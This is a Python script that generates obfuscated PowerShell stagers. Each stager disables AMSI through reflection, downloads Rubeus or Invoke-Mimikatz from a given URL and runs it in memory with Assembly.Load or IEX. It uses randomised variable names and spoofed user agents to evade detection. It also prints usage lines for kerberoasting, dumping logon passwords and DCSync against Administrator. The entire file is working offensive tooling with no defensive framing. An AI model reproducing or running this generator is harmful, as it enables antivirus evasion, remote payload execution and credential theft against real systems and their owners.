#!/usr/bin/env python3
"""
Polymorphic Tool Stager Generator
Generates in-memory loading cradles for:
- .NET assemblies (Rubeus) via [Reflection.Assembly]::Load()
- PowerShell scripts (Invoke-Mimikatz) via AMSI bypass + IEX
Each invocation produces unique variable names, AMSI bypass, and obfuscation.
"""

import random
import string
import argparse


def rand_var():
    return '$' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 9)))


def to_byte_array(s):
    codes = ','.join(str(ord(c)) for c in s)
    return f"[byte[]]({codes})"


def gen_amsi_bypass():
    v_type = rand_var()
    v_field = rand_var()
    v_cn = rand_var()
    v_fn = rand_var()

    part1_bytes = to_byte_array("System.Management.Automation.")
    part2_bytes = to_byte_array("AmsiUtils")
    field_bytes = to_byte_array("amsiInitFailed")

    return f"""{v_cn}=[Text.Encoding]::UTF8.GetString({part1_bytes})+[Text.Encoding]::UTF8.GetString({part2_bytes})
{v_fn}=[Text.Encoding]::UTF8.GetString({field_bytes})
{v_type}=[Ref].Assembly.GetType({v_cn})
{v_field}={v_type}.GetField({v_fn},[Reflection.BindingFlags]'NonPublic,Static')
{v_field}.SetValue($null,$true)"""


def gen_dotnet_loader(tool_url, tool_name, output_path):
    """Generate in-memory .NET assembly loader (for Rubeus)."""
    amsi = gen_amsi_bypass()

    v_wc = rand_var()
    v_bytes = rand_var()
    v_asm = rand_var()
    v_url = rand_var()
    v_fn = rand_var()

    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0',
    ]
    random.shuffle(agents)

    func_name = f"Invoke-{tool_name}" + ''.join(random.choices(string.ascii_uppercase, k=3))

    stager = f"""# {tool_name} in-memory loader - {random.randint(10000,99999)}
{amsi}

{v_url}='{tool_url}'
{v_wc}=New-Object Net.WebClient
{v_wc}.Headers.Add('User-Agent','{agents[0]}')
{v_bytes}={v_wc}.DownloadData({v_url})
{v_asm}=[Reflection.Assembly]::Load({v_bytes})

function {func_name} {{
    param([string]{v_fn})
    if({v_fn}){{
        {v_asm}.EntryPoint.Invoke($null,@(,({v_fn}.Split(' '))))
    }} else {{
        {v_asm}.EntryPoint.Invoke($null,@(,@()))
    }}
}}

Write-Host "[+] {tool_name} loaded in memory"
Write-Host "[*] Usage: {func_name} 'kerberoast'"
Write-Host "[*]        {func_name} 'asreproast /format:hashcat'"
Write-Host "[*]        {func_name} 'triage'"
Set-Alias -Name {tool_name.lower()} -Value {func_name}
"""

    with open(output_path, 'w') as f:
        f.write(stager)

    print(f"[+] Generated {tool_name} in-memory loader: {output_path}")
    print(f"    Function: {func_name}")
    return output_path


def gen_script_loader(script_url, tool_name, output_path):
    """Generate AMSI bypass + IEX cradle for PowerShell scripts (Invoke-Mimikatz)."""
    amsi = gen_amsi_bypass()

    v_wc = rand_var()
    v_url = rand_var()
    v_script = rand_var()

    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    ]
    random.shuffle(agents)

    stager = f"""# {tool_name} reflective loader - {random.randint(10000,99999)}
{amsi}

{v_url}='{script_url}'
{v_wc}=New-Object Net.WebClient
{v_wc}.Headers.Add('User-Agent','{agents[0]}')
{v_script}={v_wc}.DownloadString({v_url})
IEX {v_script}

Write-Host "[+] {tool_name} loaded (reflective PE injection)"
Write-Host "[*] Usage: Invoke-Mimikatz -DumpCreds"
Write-Host "[*]        Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"'"
Write-Host "[*]        Invoke-Mimikatz -Command '\"lsadump::dcsync /user:Administrator\"'"
"""

    with open(output_path, 'w') as f:
        f.write(stager)

    print(f"[+] Generated {tool_name} script loader: {output_path}")
    return output_path


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Polymorphic Tool Stager Generator')
    parser.add_argument('--tool-url', required=True, help='URL to the tool binary or script')
    parser.add_argument('--tool-name', required=True, help='Tool name (e.g., Rubeus, Mimikatz)')
    parser.add_argument('--mode', choices=['dotnet', 'script'], required=True,
                        help='dotnet = in-memory Assembly.Load, script = AMSI bypass + IEX')
    parser.add_argument('-o', '--output', default='tool_stager.ps1', help='Output file path')
    args = parser.parse_args()

    if args.mode == 'dotnet':
        gen_dotnet_loader(args.tool_url, args.tool_name, args.output)
    else:
        gen_script_loader(args.tool_url, args.tool_name, args.output)
